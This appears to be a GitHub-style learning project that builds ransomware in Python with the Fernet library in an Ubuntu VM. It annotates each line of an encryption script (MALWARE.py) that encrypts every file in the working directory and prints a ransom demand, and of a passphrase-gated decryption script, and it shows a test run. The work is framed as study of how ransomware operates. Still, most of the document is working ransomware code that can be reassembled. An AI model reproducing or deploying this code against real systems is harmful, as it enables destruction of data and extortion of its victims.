<h3>Ransomware</h3> 

Ransomware deployment using Python scripting

<h3>Objective</h3> 

As ransomware attacks have been on a steady upward trend, I wanted to take the time to understand the mechanics of one of the most popular cyberattacks methods.

<h3>Skills Learned</h3> 

- Python scripting

- Cryptography

<h3>Tools Used</h3> 

- Python

- Linux VM  

- Fernet

Steps

First we are going to spin up an Ubuntu VM

Next we will create a directory with several files that we are going to test our ransomware on.

We will insert into the CLI "mkdir ransomware101" to create a directory. 

In the directory we will run "echo "file content" > filename.txt" //  We will run this serveral times to create files: file.txt, file2.txt, and file3.txt.

Next we will create the malware script.

<h3>Creating the Ransomware Script</h3>

![Encryption](https://github.com/user-attachments/assets/edf5a8c4-e0b2-4010-b4cf-8c5a9ea1bffd)

Ref 2: Creating The Encryption Script (MALWARE.py) 

The ransomware script will be titled, "MALWARE.py".

To make this project easier to read I will briefly notate each line of code seperated by "//" to explain its utility in the script.

#!/usr/bin/env python3 // First we have to include the shebang for our Python script. This tells Linux to run the file as a Python script. 
 
Import os // Allows Python to interact with the OS.

from cryptography.fernet import Fernet // This imports Fernet so we can use its encryption 128bit encryption abilities. For the script to run properly we need to run "pip install crpytography" in the Linux terminal to install the necessary Python modules.

files = [] // This will create an empty list called "files".

for file in os.listdir() // This is a for loop, this will list all the files in the directory.

if os.path.isfile(file) // If object is a file, add to the file list

if file == "MALWARE.py" or file == "thekey.key" or file == "DECRYPT.py": // We are about to create a conditional statement to exclude these files from the list

continue // This tells the script to continue to the next statement and skip the current iteration, meaning the files in the if statement above will be excluded from the rest of the script. 

files.append(file) // This will append(add) any file targeted in the for loop to the files list.

print(files) // Will display the "files" list in the terminal.

key = Fernet.generate_key() // This will generate the encryption key.

with open("thekey.key", "wb") as thekey: // This line uses the open function to open the file in write mode and reference the file as "thekey" throughout the script.

for file in files: // This is creating a loop for the file's in the "files" list created earlier.

with open(file, "rb") as thefile: // This line will open the file's in the list in read binary mode and assigned the alias "thefile".

contents = thefile.read() // We have now made contents a alias to the file. This will allow us to plug in the data into the Fernet module.

contents_encrypted = Fernet(key).encrypt(contents) // This line encrypts the contents variable with the Fernet key.

with open(file, "wb") as thefile: // Sets the script to write back to "thefile".

thefile.write(contents_encrypted) // Writes the "contents_encrypted" to the file.

print("All of your files have been encrypted. Contact 890-589-5542 to decrypt your data, for a price") // This is displayed in the terminal when the Python script is executed


<h3>Decryption Sequence</h3> 


![Decryption](https://github.com/user-attachments/assets/5d1837e5-909c-4cf7-9fe0-a973e5fd3e94)

Ref 2: Creating The Decryption Script (DECRYPT.py)

The first half of the script from the beginning up until the "print(files)" line is the same as the MALWARE.py script, I will not reiterate these lines for obvious reasons.

with open("thekey.key", "rb") as key: // opens key file in read binary mode making "key" a variable.

secretkey = key.read() // The "secretkey" equals the contents of the file variable assigned as "key", the ".read" will make the encryption key functional in the decryption portion of the script.

secretphrase = "112113114" // This is going to be the secret password that decrypts the files.

user_phrase = input("Enter the secret phrase to decrypt your files\n") // input is going to allow the user to type the password into the terminal.  

if user_phrase == secretphrase: // If the password inputted by the user is equal to the secret phrase we assigned, the nested for loop will execute.

The code of the for loop is going to remain very similar to the for loop in the MALWARE.py script with a few small changes. 

contents_decrypted = Fernet(secretkey).decrypt(contents) // This decrypts the files using the decryption key generated by Fernet. 

thefile.write(contents_decrypted) // The contents are now written back to the file.

print("Files decrypted, thank you for your business") // the last sequence of our if statement will print this message informing the user that their files have been decrypted.

else: // If  the "if" statement is false the else statement will run.

print("Wrong passphrase") // When the user inputs an incorrect password upon being prompted for the secret phrase, this output will print in the terminal.


Lets test our scripts!

![results](https://github.com/user-attachments/assets/ef007d90-74cf-40ae-b97d-67d0827bd6ac)

Ref 3: Execution both the Encryption/Decryption Scripts

cat file2.txt // This will display the contents of a the files.

cat thekey.key // Here I am showing the 128bit encryption key generated by Fernet. This file is excluded from the file list that becomes encrypted in our MALWARE.py script because 
we do not want the encryption key getting encrypted.

python3 MALWARE.py // We have now executed our Python script in the directory. 

You now see a list of the files encrypted and the message we left for the user on who to contact to decrypt the files, for a price.

cat file2.txt // As you can see, the data in file is now encrypted.

python3 DECRYPT.py // Now that the files have been encrypted lets decrypt them with our decryption script.

The script prompts us for the secret phrase which was set in the DECRYPT.py script.

If you input the correct secret phrase, a message appears thanking us for our business, and that the files have been decrypted.

cat file2.txt // Now when we check our file we have the original contents of the file because our data has been decrypted.
